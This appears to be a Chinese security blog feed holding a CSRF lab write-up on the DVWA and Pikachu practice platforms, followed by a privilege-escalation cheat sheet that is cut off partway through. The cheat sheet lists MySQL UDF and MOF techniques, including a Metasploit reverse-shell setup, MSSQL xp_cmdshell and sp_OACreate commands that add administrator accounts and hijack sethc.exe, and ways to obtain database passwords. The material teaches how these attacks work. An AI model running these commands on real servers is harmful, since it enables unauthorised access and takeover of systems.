title="DVWA（CSRF部分）"></a>DVWA（CSRF部分）</h4><h5 id="simple"><a href="#simple" class="headerlink" title="simple:"></a>simple:</h5><img src="QQ截图20200123184231.png" style="zoom:50%;" /><p><strong>分析：</strong></p><p>​      我们分析源代码可知，服务器收到修改密码的请求后，会检查参数password_new password_conf是否相同，如果相同，就会修改密码，并没有任何的防CSRF机制，所以我们只需要用户在cookie还有效的时间内在相同的浏览器访问我们给定的url（该操作是服务器对请求的发送者进行了身份验证，检查cookie），就可以实现CSRF攻击，修改用户密码。</p><p><strong>漏洞利用</strong></p><p>我们可以构造如下URL进行修改密码：</p><p><a href="http://localhost/DVWA/vulnerabilities/csrf/?password_new=admin&amp;password_conf=admin&amp;Change=Change#" target="_blank" rel="noopener">http://localhost/DVWA/vulnerabilities/csrf/?password_new=admin&amp;password_conf=admin&amp;Change=Change#</a></p><p>我们构造一个html表单提交页面</p><img src="QQ截图20200128112112.png" style="zoom:67%;" /><p>将html文件放入本地网站的根目录下。</p><p>我们尝试在本地访问该网页</p><img src="QQ截图20200128112036.png" style="zoom:50%;" /><p>点击后发现跳转到了DVWA更改密码界面，密码被修改</p><img src="QQ截图20200128112051.png" style="zoom:67%;" /><h5 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h5><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">isset</span><span class="token punctuation">(</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string">'Change'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// Checks to see where the request came from</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">stripos</span><span class="token punctuation">(</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span> <span class="token string">'HTTP_REFERER'</span> <span class="token punctuation">]</span> <span class="token punctuation">,</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span> <span class="token string">'SERVER_NAME'</span> <span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token boolean">false</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// Get input</span>        <span class="token variable">$pass_new</span>  <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string">'password_new'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$pass_conf</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string">'password_conf'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// Do the passwords match?</span>        <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$pass_new</span> <span class="token operator">==</span> <span class="token variable">$pass_conf</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// They do!</span>            <span class="token variable">$pass_new</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$pass_new</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">trigger_error</span><span class="token punctuation">(</span><span class="token string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span><span class="token punctuation">,</span> <span class="token constant">E_USER_ERROR</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string">""</span> <span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$pass_new</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span> <span class="token variable">$pass_new</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// Update the database</span>            <span class="token variable">$insert</span> <span class="token operator">=</span> <span class="token string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> <span class="token punctuation">.</span> <span class="token function">dvwaCurrentUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"';"</span><span class="token punctuation">;</span>            <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$insert</span> <span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span> <span class="token string">'&lt;pre>'</span> <span class="token punctuation">.</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$___mysqli_res</span> <span class="token operator">=</span> <span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$___mysqli_res</span> <span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'&lt;/pre>'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// Feedback for the user</span>            <span class="token keyword">echo</span> <span class="token string">"&lt;pre>Password Changed.&lt;/pre>"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// Issue with passwords matching</span>            <span class="token keyword">echo</span> <span class="token string">"&lt;pre>Passwords did not match.&lt;/pre>"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// Didn't come from a trusted source</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;pre>That request didn't look correct.&lt;/pre>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">is_null</span><span class="token punctuation">(</span><span class="token variable">$___mysqli_res</span> <span class="token operator">=</span> <span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token boolean">false</span> <span class="token punctuation">:</span> <span class="token variable">$___mysqli_res</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span> </code></pre><p><strong>分析：</strong></p><p>Medium级别的代码检查了保留变量 HTTP_REFERER（http包头的Referer参数的值，表示来源地址）中是否包含SERVER_NAME（http包头的Host参数，及要访问的主机名，这里是192.168.153.130），希望通过这种机制抵御CSRF攻击</p><p><strong>漏洞利用：</strong></p><p>我们用burp对数据进行抓包，不断对referer进行修改，最后发现referer需包含我们host名</p><img src="QQ截图20200128112923.png" style="zoom: 67%;" /><p>查阅资料了解到referer参数和链接相同，我们可以将Html文件名中包含127.0.0.1,比如将html文件修改为</p><p>127.0.0.1.html</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200128113629.png" alt=""></p><p>我们在浏览器打开127.0.0.1.html，点击submit</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200128113414.png" alt=""></p><p>我们发现密码成功修改。</p><p><strong>high</strong></p><p>high等级我们发现在url中多了user_token,并且每次修改密码user_token都随着变化</p><p>usr_token的职责：它的职责是保护用户的用户名及密码多次提交，以防密码泄露。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200128114230.png" alt=""></p><p>如果该页面不存在XSS漏洞时，此方法就可以有效杜绝CSRF漏洞</p><p>但我们可以通过利用DVWA的XSS漏洞进行有效利用</p><p><strong>利用过程</strong></p><p>我们首先利用dvwa的XSS漏洞获取浏览器cookie.</p><img src="QQ截图20200128114910.png" style="zoom:50%;" /><p>然后我们回到构造好的CSRF页面提交用Burp进行抓包</p><img src="QQ截图20200128115317.png" style="zoom:67%;" /><p>我们使用获取到的cookie进行替换，然后发包即可成功修改密码。</p><p><strong>impossibe</strong></p><img src="QQ截图20200128120628.png" style="zoom:50%;" /><p>它提示了要输入原始密码，这就保证了当前用户一定是本人，有效的确保了CSRF攻击。</p><h4 id="Pikachu平台-CSRF部分）"><a href="#Pikachu平台-CSRF部分）" class="headerlink" title="Pikachu平台(CSRF部分）"></a>Pikachu平台(CSRF部分）</h4><p><img src="QQ%E6%88%AA%E5%9B%BE20200129173327.png" alt=""></p><h5 id="CSRF-GET"><a href="#CSRF-GET" class="headerlink" title="CSRF(GET)"></a>CSRF(GET)</h5><p>我们首先根据右上角的提示登录账号</p><img src="QQ截图20200129173354.png" style="zoom:50%;" /><img src="QQ截图20200129173746.png" style="zoom:67%;" /><p>我们选择修改个人信息并用burp抓包</p><img src="QQ截图20200129173928.png" style="zoom:80%;" /><p>提交的请求来看，后台没做CSRF token，同时也是通过GET请求来提交修改信息，我们拿到这个请求，伪造一个请求链接，然后让kobe点击就好，我们构造的URL中把地址add改为hack。kobe一点击就修改了地址。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200129174206.png" alt=""></p><h5 id="CSRF-POST"><a href="#CSRF-POST" class="headerlink" title="CSRF(POST)"></a>CSRF(POST)</h5><p>POST型，所有参数在请求体中提交，我们不能通过伪造URL的方式进行攻击。</p><p>这里的攻击方式跟XSS中POST类型是一样的，攻击者可以搭建一个站点，在站点上做一个表单，诱导lucy点击这个链接，当用户点击时，就会自动向存在CSRF的服务器提交POST请求修改个人信息。</p><p>我们编写一个自动提交表单的html文件：</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">window<span class="token punctuation">.</span>onload <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"postsubmit"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://192.168.171.133/pikachu/vul/csrf/csrfpost/csrf_post_edit.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>sex<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>sex<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>girl<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>phonenum<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>phonenum<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>12345678922<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>add<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>add<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hacker<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>lucy@pikachu.com<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>postsubmit<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>​      下面把页面的URL发送给受害者，只要受害者一点击这个链接，就会自动往服务器发送POST请求，修改地址信息。</p><h5 id="CSRF（token"><a href="#CSRF（token" class="headerlink" title="CSRF（token)"></a>CSRF（token)</h5><p> CSRF的主要问题是敏感操作容易被伪造，我们可以加入Token让请求不容易被伪造</p><ul><li><p>每次请求，都增加一个随机码(需要够随机，不容易被伪造），后台每次对这个随机码进行验证</p><p>我们进入Pikachu平台的CSRF（token）页面并登录，我们可以看一下这个GET请求</p></li></ul><p><img src="QQ%E6%88%AA%E5%9B%BE20200203172940.png" alt=""></p><p>跟前面比较，这里多了一个Token，如果后台对提交的Token进行了验证，由于Token是随机的，我们就无法伪造URL了</p><h5 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h5><p><a href="https://xz.aliyun.com/t/7297" target="_blank" rel="noopener">https://xz.aliyun.com/t/7297</a></p><p><a href="https://xz.aliyun.com/t/240" target="_blank" rel="noopener">https://xz.aliyun.com/t/240</a></p><p><a href="https://cloud.tencent.com/developer/article/1472698" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1472698</a></p><p><a href="https://blog.csdn.net/SKI_12/article/details/60477557" target="_blank" rel="noopener">https://blog.csdn.net/SKI_12/article/details/60477557</a></p>]]></content>
      
      
      <categories>
          
          <category> web漏洞学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSRF学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>提权方式总结</title>
      <link href="/2020/04/03/ti-quan-fang-shi-zong-jie/"/>
      <url>/2020/04/03/ti-quan-fang-shi-zong-jie/</url>
      
        <content type="html"><![CDATA[<h2 id="linux和window中常见的提权方式"><a href="#linux和window中常见的提权方式" class="headerlink" title="linux和window中常见的提权方式"></a>linux和window中常见的提权方式</h2><h4 id="1-什么是提权"><a href="#1-什么是提权" class="headerlink" title="1.什么是提权"></a>1.什么是提权</h4><p>​        提权，顾名思义就是提升权限，当我们getshell一个网站之后，大部分情况下我们的权限是非常低的（一般只是一个apache权限）。这时候为了“扩大战果”，就需要利用提权，来让原本的低权限（如只允许列目录）→高权限（拥有修改文件的能力），提升一下权限，有助于我们继续往下渗透。</p><ul><li>Windows：User &gt;&gt; System</li><li>Linux：User &gt;&gt; Root</li></ul><h4 id="2-提权的方式"><a href="#2-提权的方式" class="headerlink" title="2.提权的方式"></a>2.提权的方式</h4><p>1.、系统漏洞提权（Linux、Windows）</p><p>2、数据库提权</p><p>3、系统配置错误提权</p><p>4、权限继承类提权</p><p>5、第三方软件/服务提权</p><p>6、WebServer漏洞提权</p><h4 id="1-系统漏洞提权"><a href="#1-系统漏洞提权" class="headerlink" title="1.系统漏洞提权"></a>1.系统漏洞提权</h4><p>系统漏洞提权一般就是利用系统自身缺陷，用来提升权限。为了使用方便，windows和linux系统均有提权用的可执行文件。</p><p>Windows的提权exp一般格式为MS08067.exe；<br>Linux的提权exp一般格式为2.6.18-194或2.6.18.c。</p><h4 id="windows提权"><a href="#windows提权" class="headerlink" title="windows提权"></a>windows提权</h4><ul><li>漏洞编号命名格式</li></ul><p>Windows系统漏洞编号命名格式为：MS08067</p><p>其中：MS是Micosoft的缩写，固定格式；08 表示年份，即2008年发布的漏洞；067 表示顺序，即当年度发布的第67个漏洞。</p><ul><li>使用exp提权</li></ul><p>在日常渗透测试过程中，我们常常会先是拿到webshell再进行提权。所以提权脚本也常常会被在webshell中运行使用。</p><p>那么我们如何知道使用哪个exp来提权呢？</p><p>我们可以使用systeminfo命令或者查看补丁目录，查看补丁记录，来判断有哪个补丁没打，然后使用相对应的exp进行提权。</p><p><strong>TIPS：</strong></p><p>1.渗透过程中经常会遇到管理员禁止了cmd.exe的使用，我们该怎么办？进止了exe文件的上传怎么办？<br> 2.管理员禁止了一些脚本函数的运行，看不到回显怎么办？<br> 3.在使用webshell提权的时候要特别注意：<br> asp的webshell要支持：<br> wscript(wscript.shell/shell.application)<br> aspx能调用.net组件来执行cmd的命令<br> /c whoami</p><h5 id="linux系统提权"><a href="#linux系统提权" class="headerlink" title="linux系统提权"></a>linux系统提权</h5><p>Linux系统漏洞的exp一般按照内核版本来命名：2.6.18-194或2.6.18.c</p><p>形如2.6.18-194，可以直接执行；形如2.6.18.c，需要编译后运行，提权。当然也有少部分exp是按照发行版版本命名。</p><p>使用exp</p><p>一般情况下linux的本地提权要用nc反弹出来，因为Linux下提升权限后得到的是交互式shell，需反弹才能进行下一步命令的执行。<br>我们可以使用uname -a命令或者cat /proc/version，来判断系统的内核情况等等，然后使用相对应的exp进行提权。<br>注：</p><p>提权过程中需要为你的提权exp赋权，chmod。<br>linux服务器很多情况下管理员会设置目录权限，我们无法修改，但是一般/tmp/目录不会被设置权限，这和windows下的tmp和回收站是一个道理，所以我们可以将exp存放到/tmp目录下。</p><h4 id="数据库提权"><a href="#数据库提权" class="headerlink" title="数据库提权"></a>数据库提权</h4><p>数据库提权是指：通过执行数据库语句、数据库函数等方式提升服务器用户的权限。</p><p>首先我们要先有能力登入数据库，所以通常我们拿到webshell之后要去网站目录去找数据库连接文件，常在形如xxx.conf或conf.xxx文件中。</p><h5 id="MySQL数据库提权"><a href="#MySQL数据库提权" class="headerlink" title="MySQL数据库提权"></a>MySQL数据库提权</h5><p>MySQL数据库一般是使用udf（用户自定义函数）提权或mof（托管对象格式）提权。</p><ul><li>udf提权（用户自定义函数）</li></ul><p><strong>条件：</strong><br>1、系统版本（Windows2000，XP,Win2003)；<br>2、拥有MYSQL的某个账号，且该账号具有对msql的insert与delete权限；<br>3、具有root账号密码。</p><p><strong>使用方法：</strong><br>1、获取当前mysql的一个数据库连接信息，通常包含地址、端口、账号、密码、库名等五个信息。<br>2、把udf专用的webshell传到服务器上，访问并进行数据库连接。<br>3、连接成功后，导出DLL文件。</p><p><strong>注：</strong></p><ul><li>Mysql&lt;5.0，导出路径随意;</li><li>5.0&lt;=mysql&lt;5.1，则需要导出至目标服务器的系统目录（如：system32），否则在下一步操作中你会看到“No paths allowed for shared library”错误；</li><li>mysql&gt;5.1，需要导出dll到插件路径，例如：D:\Program Files\MySQL\MySQL Server 5.1.3\lib\plugin<br>若mysql&gt;=5.0，语句中的DLL不允许带全路径，如果在第二步中已将DLL导出到系统目录，那么你就可以省略路径而使命令正常执行，否则将会看到”Can’t open shared library“错误。</li><li>如果提示“Function ‘cmdshell’ already exists”，则输入下列语句可以解决：drop function cmdshell;</li></ul><p><strong>使用SQL语句创建自定义函数。语法如下：</strong></p><p><code>Create Function 函数名 returns string soname &#39;导出的DLL路径&#39;;eg: Create Function cmdshell returns string soname &#39;udf.dll&#39;;</code></p><p><strong>功能函数说明：</strong></p><ul><li>cmdshell 执行cmd;</li><li>downloader 下载者,到网上下载指定文件并保存到指定目录;</li><li>open3389 通用开3389终端服务,可指定端口(不改端口无需重启);</li><li>backshell 反弹Shell;</li><li>ProcessView 枚举系统进程;</li><li>KillProcess 终止指定进程;</li><li>regread 读注册表;</li><li>regwrite 写注册表;</li><li>shut 关机,注销,重启;</li><li>about 说明与帮助函数;</li></ul><p><strong>创建函数成功后，就可以通过sql语句调用它了。</strong></p><p>语法如下：<br>select 创建的函数名 (‘参数列表’);<br>eg: select cmdshell(“net user nsfocus Nsf0cus /add”)；创建一个用户nsfocus，密码为Nsf0cus</p><p><strong>函数使用完后，我们需要把之前生成的DLL和创建的函数删除掉，但要注意次序，必须先删除函数再删除DLL。</strong></p><p>删除函数的语法如下：<br>drop function 创建的函数名;<br>eg: drop function cmdshell;</p><h5 id="整体思路："><a href="#整体思路：" class="headerlink" title="整体思路："></a>整体思路：</h5><ul><li>导出C:\windows\udf.dll</li><li>Create Function cmdshell returns string soname ‘udf.dll’;</li><li>select cmdshell(‘whoami’)</li><li>drop function cmdshell</li></ul><h5 id="Mof提权（托管对象格式）"><a href="#Mof提权（托管对象格式）" class="headerlink" title="Mof提权（托管对象格式）"></a>Mof提权（托管对象格式）</h5><p>提权c:/windows/system32/wbem/mof/</p><pre><code>- use exploit/windows/mysql/mysql_mof- set password xxx- set username xxx- set rhost xxx- set rport xxx- set payload windows/shell_reverse_tcp- set lhost xxx- set lport xxx- exploit</code></pre><h5 id="Mssql数据库提权"><a href="#Mssql数据库提权" class="headerlink" title="Mssql数据库提权"></a>Mssql数据库提权</h5><p><img src="https://img-blog.csdnimg.cn/20190611101318911.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4Njg0NTA0,size_16,color_FFFFFF,t_70" alt="img"></p><p><strong>在SA权限下</strong></p><p>1.存在xp_cmdshell时<br>使用xp_cmdshell执行命令添加用户，当出现错误可以恢复和开启xp_cmdshell</p><p>2.xp_cmdshell无法使用时<br>    使用sp_OACreate执行命令，同样当出现错误可以恢复和开启</p><ol start="3"><li><p>当执行命令无法使用时可以用沙盒提权 (使用xp_regwrite和openrowset)</p></li><li><p>当只有xp_regwrite可用时可以劫持粘滞键（sethc.exe)<br>使用xp_regwrite修改注册表</p></li></ol><p><strong>DBA权限下</strong></p><ol><li>备份到网站目录</li><li>通过备份文件到启动项提权</li></ol><h5 id="SA口令获取方法"><a href="#SA口令获取方法" class="headerlink" title="SA口令获取方法"></a>SA口令获取方法</h5><ul><li><strong>Webshell或源码获取</strong></li></ul><p>一般在网站的配置文件中有存放明文账号密码，常用配置文件名如：</p><pre><code>conn.aspxconfig.aspxconfig.phpweb.config.........一般格式如：server=localhost;UID=sa;PWD=shadowflow</code></pre><ul><li><strong>源代码泄露</strong></li></ul><p>网站源码泄露情况主要以程序员上传代码到git等开源平台或更新代码时未删除备份文件(.svn、.git、.bak），以及运维人员打包源代码到网站服务器(<a href="http://www.rar/" target="_blank" rel="noopener">www.rar</a>等）。</p><ul><li><strong>嗅探</strong></li></ul><p>在局域网中使用cain等工具进行arp嗅探的时候可以抓取到1433端口的数据库明文登录密码</p><ul><li><strong>口令暴力破解</strong></li></ul><p>利用mssql暴力破解工具对mssql进行暴力破解，一旦成功将获得sa相应权限</p><p><strong>常用SQL Server提权语句</strong></p><pre><code>查看数据库版本：select @@version查看数据库系统参数：exec master..xp_msver;查看用户所属角色信息：sp_helpsrvrolemember查看当前数据库：select db_name()显示机器上的驱动器：xp_availablemedia查看当前账户权限select IS_SRVROLEMEMBER(&#39;sysadmin&#39;) #判断是否为sa权限类似serveradmin,setupadmin,securityadmin,diskadmin,bulkadminselect IS_MEMBER(&#39;db_owner&#39;) #判断是否为dbo权限添加用户exec master.dbo.sp_addlogin test,password #添加用户exec master.dbo.sp_addsrvrolemember test,sysadmin #加权限启动停止服务exec master..xp_servicecontrol &#39;stop&#39;,&#39;test&#39;exec master..xp_servicecontrol &#39;start&#39;,&#39;test&#39;检查功能SELECT count(*）FROM master.dbo.sysobjects WHERE name=&#39;xp_cmdshell&#39;xp_cmdshell, xpregread,sp_makewebtask,xp_subdirs,xp_dirtree, sp_addextendedproc</code></pre><p><strong>xp_cmdshell</strong></p><pre><code>1、开启xp_cmdshell存储过程exec sp_configure &#39;show advanced options&#39;,1;RECONFIGURE;exec sp_configure &#39;xp_cmdshell&#39;,1;RECONFIGURE;2、关闭xp_cmdshell存储过程exec sp_configure &#39;show advanced options&#39;, 1, RECONFIGURE;exec sp_configure &#39;xp_cmdshell&#39;,0;RECONFIGURE;3、xp_cmdshell执行命令exec master..xp_cmdshell &#39;ver&#39;exec master.dbo.xp_cmdshell &#39;net localgroup administrators test /add&#39;4、恢复xp_cmdshellexec sp_dropextendedproc &#39;xp_cmdshell&#39;dbcc addextendedproc (&quot;xp_cmdshell&quot;,&quot;xplog70.dll) OR dbcc addextendedproc (&quot;xp_cmdshell&quot;,&quot;d:\Program Files\Microsoft SQL Server\MSSQL\Binn\xplog70.dll&quot;);EXEC sp_configure &#39;show advanced options&#39;, 0 --</code></pre><p><strong>sp_OACreate</strong></p><pre><code>1、开启sp_OACreateexec sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE;exec sp_configure &#39;Ola Automation Procedures&#39; , 1;RECONFIGURE;2、关闭sp_OACreateexec sp_configure &#39;show advanced options&#39;,1;RECONFIGURE;exec sp_configure &#39;Ole Automation Procedures&#39;,0;RECONFIGURE;3、禁用advanced optionsEXEC sp_configure &#39;show advanced options&#39;,0;GO RECONFIGURE;4、sp_OACreate执行命令DECLARE @js intEXEC sp_OACreate &#39;ScriptControl&#39;,@js OUTEXEC sp_OASetProperty @js,&#39;Language&#39;,&#39;JavaScript&#39;ActiveXObject(&quot;Shell.Users&quot;);z=o.create(&quot;user&quot;);z.changePassword(&quot;pass&quot;,&quot;&quot;);z.setting(&quot;AccountType&quot;)=3;&#39;5、sp_OACreate移动文件declare @aa intexec sp_oacreate &#39;scripting.filesystemobject&#39; @aa outexec sp_oamethod @aa, &#39;moveFile&#39;,null,&#39;c:\temp\ipmi.log&#39;,&#39;c:\temp\ipmi1.log&#39;;6、sp_OACreate复制文件declare @o intexec sp_oacreate &#39;scripting.filesystemobject&#39;, @o outexec sp_oamethod @o,&#39;copyfile&#39;,null,&#39;c:\windows\explorer.exe&#39;,&#39;c:\windows\system32\sethc.exe&#39;;7、sp_OACreate删除文件DECLARE @Result intDECLARE @FSO_Token intEXEC @Result = sp_OACreate &#39;Scripting.FileSystemObject&#39;, @FSO_Token OUTPUTEXEC @Result = sp_OAMethod @FSO_Token, &#39;DeleteFile&#39;,NULL,&#39;c:\Documents and Settings\All Users\ [开始] 菜单\程序\启动\user.bat&#39;EXEC @Result = sp_OADestrop @FSO_Token8、wscript.shell执行命令9、Shell.Application执行命令10、sp_oacreate 